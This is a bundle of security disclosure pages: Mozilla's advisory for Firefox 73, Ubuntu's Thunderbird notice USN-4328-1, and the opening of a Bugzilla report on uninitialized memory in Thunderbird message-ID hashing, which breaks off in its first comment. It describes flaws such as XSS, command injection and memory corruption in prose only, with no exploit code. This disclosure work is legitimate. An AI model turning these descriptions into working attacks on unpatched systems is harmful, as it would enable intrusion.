    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-05

## Security Vulnerabilities fixed in Firefox 73

Announced
February 11, 2020
Impact
high
Products
Firefox
Fixed in

* Firefox 73

#### [#CVE-2020-6796: Missing bounds check on shared memory read in the parent process](#CVE-2020-6796)

Reporter
Thomas Imbert
Impact
high
##### Description

A content process could have modified shared memory relating to crash reporting information, crash itself, and cause an out-of-bound write. This could have caused memory corruption and a potentially exploitable crash.

##### References

* [Bug 1610426](https://bugzilla.mozilla.org/show_bug.cgi?id=1610426)

#### [#CVE-2020-6797: Extensions granted downloads.open permission could open arbitrary applications on Mac OSX](#CVE-2020-6797)

Reporter
Vladimir Metnew
Impact
moderate
##### Description

By downloading a file with the .fileloc extension, a semi-privileged extension could launch an arbitrary application on the user's computer. The attacker is restricted as they are unable to download non-quarantined files or supply command line arguments to the application, limiting the impact.
*Note: this issue only occurs on Mac OSX. Other operating systems are unaffected.*

##### References

* [Bug 1596668](https://bugzilla.mozilla.org/show_bug.cgi?id=1596668)

#### [#CVE-2020-6798: Incorrect parsing of template tag could result in JavaScript injection](#CVE-2020-6798)

Reporter
terjanq
Impact
moderate
##### Description

If a `<template>` tag was used in a `<select%gt;` tag, the parser could be confused and allow JavaScript parsing and execution when it should not be allowed. A site that relied on the browser behaving correctly could suffer a cross-site scripting vulnerability as a result.

##### References

* [Bug 1602944](https://bugzilla.mozilla.org/show_bug.cgi?id=1602944)

#### [#CVE-2020-6799: Arbitrary code execution when opening pdf links from other applications, when Firefox is configured as default pdf reader](#CVE-2020-6799)

Reporter
Joshua Graham & Brendan Scarvell
Impact
moderate
##### Description

Command line arguments could have been injected during Firefox invocation as a shell handler for certain unsupported file types. This required Firefox to be configured as the default handler for a given file type and for a file downloaded to be opened in a third party application that insufficiently sanitized URL data. In that situation, clicking a link in the third party application could have been used to retrieve and execute files whose location was supplied through command line arguments.
*Note: This issue only affects Windows operating systems and when Firefox is configured as the default handler for non-default filetypes. Other operating systems are unaffected.*

##### References

* [Bug 1606596](https://bugzilla.mozilla.org/show_bug.cgi?id=1606596)

#### [#CVE-2020-6800: Memory safety bugs fixed in Firefox 73 and Firefox ESR 68.5](#CVE-2020-6800)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Raul Gurzau, Tyson Smith, Bob Clary, Liz Henry, and Christian Holler reported memory safety bugs present in Firefox 72 and Firefox ESR 68.4. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 73 and Firefox ESR 68.5](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777)

#### [#CVE-2020-6801: Memory safety bugs fixed in Firefox 73](#CVE-2020-6801)

Reporter
Mozilla developers
Impact
high
##### Description

Mozilla developers Jason Kratzer, Tyson Smith, and Christian Holler reported memory safety bugs present in Firefox 72. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 73](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1601024%2C1601712%2C1604836%2C1606492)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from usn.ubuntu.com_f34c5689_20250119_123141.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4328-1: Thunderbird vulnerabilities

13 April 2020

Several security issues were fixed in Thunderbird.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 19.10](/security/notices?release=eoan)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

It was discovered that Message ID calculation was based on uninitialized

data. An attacker could potentially exploit this to obtain sensitive

information. ([CVE-2020-6792](/security/CVE-2020-6792))

Mutiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted message, an attacker could

potentially exploit these to cause a denial of service, obtain sensitive

information, or execute arbitrary code. ([CVE-2020-6793](/security/CVE-2020-6793), [CVE-2020-6795](/security/CVE-2020-6795),

[CVE-2020-6822](/security/CVE-2020-6822))

It was discovered that if a user saved passwords before Thunderbird 60

and then later set a master password, an unencrypted copy of these

passwords would still be accessible. A local user could exploit this to

obtain sensitive information. ([CVE-2020-6794](/security/CVE-2020-6794))

Multiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted website in a browsing context,

an attacker could potentially exploit these to cause a denial of service,

conduct cross-site scripting (XSS) attacks, obtain sensitive information,

or execute arbitrary code. ([CVE-2019-20503](/security/CVE-2019-20503), [CVE-2020-6798](/security/CVE-2020-6798), [CVE-2020-6800](/security/CVE-2020-6800),

[CVE-2020-6805](/security/CVE-2020-6805), [CVE-2020-6806](/security/CVE-2020-6806), [CVE-2020-6807](/security/CVE-2020-6807), [CVE-2020-6812](/security/CVE-2020-6812), [CVE-2020-6814](/security/CVE-2020-6814),

[CVE-2020-6819](/security/CVE-2020-6819), [CVE-2020-6820](/security/CVE-2020-6820), [CVE-2020-6821](/security/CVE-2020-6821), [CVE-2020-6825](/security/CVE-2020-6825))

It was discovered that the Devtools’ ‘Copy as cURL’ feature did not

fully escape website-controlled data. If a user were tricked in to using

the ‘Copy as cURL’ feature to copy and paste a command with specially

crafted data in to a terminal, an attacker could potentially exploit this

to execute arbitrary commands via command injection. ([CVE-2020-6811](/security/CVE-2020-6811))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 19.10

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.7.0+build1-0ubuntu0.19.10.1](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.7.0%2Bbuild1-0ubuntu0.19.10.1)

##### Ubuntu 18.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.7.0+build1-0ubuntu0.18.04.1](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.7.0%2Bbuild1-0ubuntu0.18.04.1)

After a standard system update you need to restart Thunderbird to make

all the necessary changes.

## References

* [CVE-2020-6792](/security/CVE-2020-6792)
* [CVE-2020-6793](/security/CVE-2020-6793)
* [CVE-2020-6794](/security/CVE-2020-6794)
* [CVE-2020-6795](/security/CVE-2020-6795)
* [CVE-2020-6798](/security/CVE-2020-6798)
* [CVE-2020-6800](/security/CVE-2020-6800)
* [CVE-2019-20503](/security/CVE-2019-20503)
* [CVE-2020-6805](/security/CVE-2020-6805)
* [CVE-2020-6806](/security/CVE-2020-6806)
* [CVE-2020-6807](/security/CVE-2020-6807)
* [CVE-2020-6811](/security/CVE-2020-6811)
* [CVE-2020-6812](/security/CVE-2020-6812)
* [CVE-2020-6814](/security/CVE-2020-6814)
* [CVE-2020-6819](/security/CVE-2020-6819)
* [CVE-2020-6820](/security/CVE-2020-6820)
* [CVE-2020-6821](/security/CVE-2020-6821)
* [CVE-2020-6822](/security/CVE-2020-6822)
* [CVE-2020-6825](/security/CVE-2020-6825)

## Related notices

* [USN-4335-1](/security/notices/USN-4335-1)
* [USN-4278-1](/security/notices/USN-4278-1)
* [USN-4278-2](/security/notices/USN-4278-2)
* [USN-4299-1](/security/notices/USN-4299-1)
* [USN-4317-1](/security/notices/USN-4317-1)
* [USN-4323-1](/security/notices/USN-4323-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from bugzilla.mozilla.org_a5f96439_20250119_140913.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1609607)
* [XML](/show_bug.cgi?ctype=xml&id=1609607)

Closed
[Bug 1609607](/show_bug.cgi?id=1609607)
(CVE-2020-6792)

Opened 5 years ago
Closed 5 years ago

# C-C TB mochitest+valgrind uncovered uninitialized memory access.: MD5 is calculated accessing uninitialized area.

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

C-C TB mochitest+valgrind uncovered uninitialized memory access.: MD5 is calculated accessing uninitialized area.

## Categories

### (MailNews Core :: Backend, defect)

[Product:](/describecomponents.cgi?product=MailNews%20Core)

MailNews Core
▾

MailNews Core
Mail and news components common to Thunderbird and SeaMonkey
[See Open Bugs in This Product](/buglist.cgi?product=MailNews%20Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=MailNews%20Core)
Watch This Product

[Component:](/describecomponents.cgi?product=MailNews%20Core&component=Backend#Backend)

Backend
▾

MailNews Core :: Backend
Problems with RDF data sources and application logic. Most likely, your problem can fit in one of the other components so this component should be rarely used.
[See Open Bugs in This Component](/buglist.cgi?product=MailNews%20Core&component=Backend&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=MailNews%20Core&component=Backend&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=MailNews%20Core&component=Backend)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Trunk

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

## Tracking

### (thunderbird\_esr68+ fixed, thunderbird73 fixed)

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

Thunderbird 74.0

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| thunderbird\_esr68 | [+](/buglist.cgi?f1=cf_tracking_thunderbird_esr68&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_thunderbird_esr68&o1=equals&v1=fixed) |
| thunderbird73 | --- | [fixed](/buglist.cgi?f1=cf_status_thunderbird_73&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| relnote-thunderbird |  | --- |
| thunderbird\_esr68 | + | fixed |
| thunderbird73 |  | fixed |
| seamonkey2.53 | --- | --- |
| seamonkey2.57esr | --- | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| thunderbird133 | --- | --- |
| thunderbird134 | --- | --- |
| thunderbird135 | --- | --- |
| thunderbird136 | --- | --- |

## People

### (Reporter: ishikawa, Assigned: ishikawa)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/72bd216fb7996e1571c307d45a70add2?d=mm&size=40)  [ishikawa](/user_profile?user_id=32503)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/72bd216fb7996e1571c307d45a70add2?d=mm&size=40)  [ishikawa](/user_profile?user_id=32503)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

---

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

5 people

## References

### (Blocks 1 open bug)

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[CVE-2020-6793](/show_bug.cgi?id=1608539 "RESOLVED FIXED - C-C TB mochitest+valgrind uncovered uninitialized memory access.: |m_headerstartpos| is not always initialized in nsParseMailMessageState::FinalizeHeaders()")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[1592860](/show_bug.cgi?id=1592860 "NEW - [META] Hidden issues of xpcshell test of C-C TB (hidden because they don't get printed if the test succeeds).")

Dependency [tree](/showdependencytree.cgi?id=1609607&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1609607)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: csectype-uninitialized, sec-low)

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-6792

[Keywords:](/describekeywords.cgi)

[csectype-uninitialized](/buglist.cgi?keywords=csectype-uninitialized&resolution=---),
[sec-low](/buglist.cgi?keywords=sec-low&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

|  | wanted-thunderbird |  |
| --- | --- | --- |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | relnote |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (5 files)

| [Dump the buffer area when MD5 is calculated for message ID creation.](/attachment.cgi?id=9121231)  [5 years ago](#c1)  [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)   10.52 KB, patch |  | [Details](/attachment.cgi?id=9121231&action=edit) | [Diff](/attachment.cgi?id=9121231&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1609607&attachment=9121231) |
| --- | --- | --- |
| [Identifying which tests trigger the symptom](/attachment.cgi?id=9121233)  [5 years ago](#c4)  [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)   421.01 KB, text/plain |  | [Details](/attachment.cgi?id=9121233&action=edit) |
| [valgrind-xpctest-check.patch (take 3)](/attachment.cgi?id=9121387)  [5 years ago](#c7)  [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)   11.47 KB, patch |  | [Details](/attachment.cgi?id=9121387&action=edit) | [Diff](/attachment.cgi?id=9121387&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1609607&attachment=9121387) |
| [Extracted lines from xpcshell-tests log file with the patch.](/attachment.cgi?id=9121390)  [5 years ago](#c8)  [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)   96.39 KB, text/plain |  | [Details](/attachment.cgi?id=9121390&action=edit) |
| [1609607-v2.patch](/attachment.cgi?id=9122922)  [5 years ago](#c15)  [Kai Engert [:KaiE:]](/user_profile?user_id=36541)   1.06 KB, patch | mkmelin : [review+](#a738014_101158 "5 years ago")  mkmelin : [approval-comm-beta+](#a1225976_101158 "5 years ago")  mkmelin : [approval-comm-esr68+](#a1666708_101158 "5 years ago") | [Details](/attachment.cgi?id=9122922&action=edit) | [Diff](/attachment.cgi?id=9122922&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1609607&attachment=9122922) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [ISHIKAWA, Chiaki (back from day job exhibition event.)](/user_profile?user_id=32503)  Assignee |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1609607#c0)• 5 years ago |
|  | |

+++ This bug was initially created as a clone of [Bug #1608539](/show_bug.cgi?id=1608539 "RESOLVED FIXED - C-C TB mochitest+valgrind uncovered uninitialized memory access.: |m_headerstartpos| is not always initialized in nsParseMailMessageState::FinalizeHeaders()") +++

That bug is about the following.

--- BEGIN QUOTE ---

The subject says it all

|m\_headerstartpos| is not always initialized in nsParseMailMessageState::FinalizeHeaders()

The unitinitialized reference happens at

<https://searchfox.org/comm-central/source/mailnews/local/src/nsParseMailbox.cpp#1223>

I found this by running xpcshell-tests under valgrind.

If m\_headerstartpos is not properly initialized, literally anything goes.

Header parsing, etc. get all screwed up.

The symptom of strange display of message in a message pane that shows only blank or in the middle of header, etc. could be at least partially explained by this bug. (Maybe not all the cases.)

I detected the issue using valgrind, and then began dumping m\_headerstartpos after I set

```
export MALLOC_CHECK_=3
export MALLOC_PERTURB_=0x5A

```

in my environment. GNU libc malloc fills the uninitialized malloc'ed area with 0xA5.

Thus it is rather easy to find it in an otherwise normal dump.

```
cf. From man mallopt.

       M_PERTURB (since glibc 2.4)
              If this parameter is set to a nonzero value, then bytes of allocated memory  (other  than  alloca‐
              tions  via calloc(3)) are initialized to the complement of the value in the least significant byte
              of value, and when allocated memory is released using free(3), the freed  bytes  are  set  to  the
              least  significant  byte  of value.  This can be useful for detecting errors where programs incor‐
              rectly rely on allocated memory being initialized to zero, or reuse values in memory that has  al‐
              ready been freed.
   ...
       MALLOC_PERTURB_
